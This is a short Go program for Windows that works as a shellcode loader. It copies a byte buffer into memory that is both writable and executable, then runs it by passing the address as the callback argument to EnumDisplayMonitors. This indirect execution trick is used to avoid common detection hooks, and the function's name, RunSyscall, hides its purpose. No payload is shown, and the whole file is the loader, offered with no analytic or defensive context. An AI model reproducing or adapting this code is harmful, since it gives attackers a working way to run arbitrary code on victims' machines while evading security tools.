package main

import (
	"fmt"
	"syscall"
	"unsafe"
)

var (
	ntdll               = syscall.NewLazyDLL("ntdll.dll")
	NtQueryObject       = ntdll.NewProc("NtQueryObject")
	kernel32            = syscall.NewLazyDLL("kernel32.dll")
	CloseHandle         = kernel32.NewProc("CloseHandle")
	user32              = syscall.NewLazyDLL("user32.dll")
	EnumDisplayMonitors = user32.NewProc("EnumDisplayMonitors")
	RtlMoveMemory       = kernel32.NewProc("RtlMoveMemory")
)

const (
	STATUS_SUCCESS         = uintptr(0)
	PAGE_EXECUTE_READWRITE = 0x00000040
	MEM_COMMIT             = 0x00001000
)

type IO_STATUS_BLOCK struct {
	Status uintptr
	_      [32]byte
}

type UNICODE_STRING struct {
	Length        uint16
	MaximumLength uint16
	Buffer        *uint16
}

type FILE_NAME_INFORMATION struct {
	FileNameLength uint32
	FileName       [512]uint16
}

func RunSyscall(op []byte) {
	addr, err := VirtualAlloc(0, uintptr(len(op)), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	if err != nil {
		panic(err)
	}
	RtlMoveMemory.Call(addr, uintptr(unsafe.Pointer(&op[0])), uintptr(len(op)))
	EnumDisplayMonitors.Call(0, 0, uintptr(addr), 0)
}

func VirtualAlloc(lpAddress uintptr, dwSize uintptr, flAllocationType uint32, flProtect uint32) (uintptr, error) {
	ret, _, err := syscall.Syscall6(
		syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualAlloc").Addr(),
		4,
		lpAddress,
		dwSize,
		uintptr(flAllocationType),
		uintptr(flProtect),
		0,
		0,
	)
	if err != 0 {
		return 0, fmt.Errorf("VirtualAlloc failed: %v", err)
	}
	return ret, nil
}
